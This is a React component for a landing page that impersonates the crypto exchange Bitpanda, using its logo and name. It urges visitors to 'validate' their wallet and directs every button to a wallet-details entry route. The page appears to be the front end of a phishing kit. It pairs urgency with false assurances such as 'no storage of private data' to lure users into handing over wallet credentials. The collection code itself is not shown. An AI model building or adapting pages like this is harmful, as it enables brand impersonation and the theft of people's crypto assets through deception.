import React from 'react';
import { ArrowRight, ShieldCheck, Lock, CheckCircle, Mail, Globe } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
// import './bitPandaLanding.css';
import './test.css'
import bitpandaLogo from '../../assets/Bitpanda_logo.png';
import { color } from 'framer-motion';

const BitpandaLanding = () => {
  const navigate = useNavigate();

  return (
    <div className="bitpanda-container">
      {/* NAV */}
      <nav className="bitpanda-nav">
        <div className="bitpanda-nav-content">
          <div className="bitpanda-nav-left">
            <img src={bitpandaLogo} alt="Bitpanda" />
            
          </div>

          <button
            className="bitpanda-nav-btn"
            onClick={() => navigate('/bitpanda-wallet')}
          >
            Validate Wallet
          </button>
        </div>
      </nav>

      {/* HERO */}
      <section className="bitpanda-hero">
        <div className="bitpanda-hero-content fade-in">
          <h1>
            Secure wallet validation<br />
            <span>designed to protect your assets</span>
          </h1>

          <p>
            Validate ownership of your wallet to ensure enhanced protection,
            uninterrupted access, and compliance with modern security standards.
          </p>

          <div className="bitpanda-hero-actions">
            <button
              className="bitpanda-primary-btn"
              onClick={() => navigate('/bitpanda-wallet')}
            >
              Start Wallet Validation
              <ArrowRight size={18} />
            </button>

            <span className="bitpanda-hero-note">
              Takes less than 2 minutes
            </span>
          </div>
        </div>
      </section>

      {/* WHY VALIDATE */}
      <section className="bitpanda-section slide-up">
        <h2>Why wallet validation matters</h2>
        <p className="bitpanda-section-sub">
          Wallet validation ensures that only the rightful owner can access and
          manage digital assets.
        </p>

        <div className="bitpanda-grid">
          <div className="bitpanda-card">
            <ShieldCheck />
            <h3>Ownership verification</h3>
            <p>
              Confirms that the wallet belongs to you and prevents unauthorised access.
            </p>
          </div>

          <div className="bitpanda-card">
            <Lock />
            <h3>Enhanced protection</h3>
            <p>
              Reduces the risk of phishing, impersonation, and malicious activity.
            </p>
          </div>

          <div className="bitpanda-card">
            <Globe />
            <h3>Global compliance</h3>
            <p>
              Aligns with international security practices and regulatory standards.
            </p>
          </div>
        </div>
      </section>

      {/* PROCESS */}
      <section className="bitpanda-section alt-bg slide-up">
        <h2 style={{ color: '#103d36' }}>How the validation process works</h2>

        <div className="bitpanda-steps">
          <div className="bitpanda-step">
            <span>01</span>
            <h4>Submit wallet details</h4>
            <p>
              Enter the required wallet information through our secure interface.
            </p>
          </div>

          <div className="bitpanda-step">
            <span>02</span>
            <h4>Security verification</h4>
            <p>
              Our system validates ownership without storing sensitive credentials.
            </p>
          </div>

          <div className="bitpanda-step">
            <span>03</span>
            <h4>Email confirmation</h4>
            <p>
              You receive a confirmation email once validation is completed.
            </p>
          </div>
        </div>
      </section>

      {/* TRUST */}
      <section className="bitpanda-section slide-up">
        <h2>Built with security at the core</h2>

        <div className="bitpanda-trust">
          <div className="bitpanda-trust-item">
            <CheckCircle />
            <span>No storage of private data</span>
          </div>

          <div className="bitpanda-trust-item">
            <CheckCircle />
            <span>Encrypted communication channels</span>
          </div>

          <div className="bitpanda-trust-item">
            <CheckCircle />
            <span>Manual review for suspicious activity</span>
          </div>

          <div className="bitpanda-trust-item">
            <CheckCircle />
            <span>UK & EU security standards</span>
          </div>
        </div>
      </section>

      {/* EMAIL */}
      <section className="bitpanda-section alt-bg slide-up">
        <h2 style={{ color: '#103d36' }}>Clear communication at every step</h2>

        <div className="bitpanda-email">
          <Mail size={42} />
          <p>
            Once your wallet is validated, you will receive a confirmation email
            with next steps and security recommendations.
          </p>
        </div>
      </section>

      {/* CTA */}
      <section className="bitpanda-cta">
        <h2>Ready to secure your wallet?</h2>
        <p>
          Begin the validation process now and ensure your assets remain protected.
        </p>

        <button
          className="bitpanda-primary-btn large"
          onClick={() => navigate('/bitpanda-wallet')}
        >
          Validate Wallet Now
          <ArrowRight />
        </button>
      </section>

      {/* FOOTER */}
      <footer className="bitpanda-footer">
        <p>© 2025 Bitpanda Digital Assets. All rights reserved.</p>
        <p>Wallet validation services provided for security purposes only.</p>
      </footer>
    </div>
  );
};

export default BitpandaLanding;
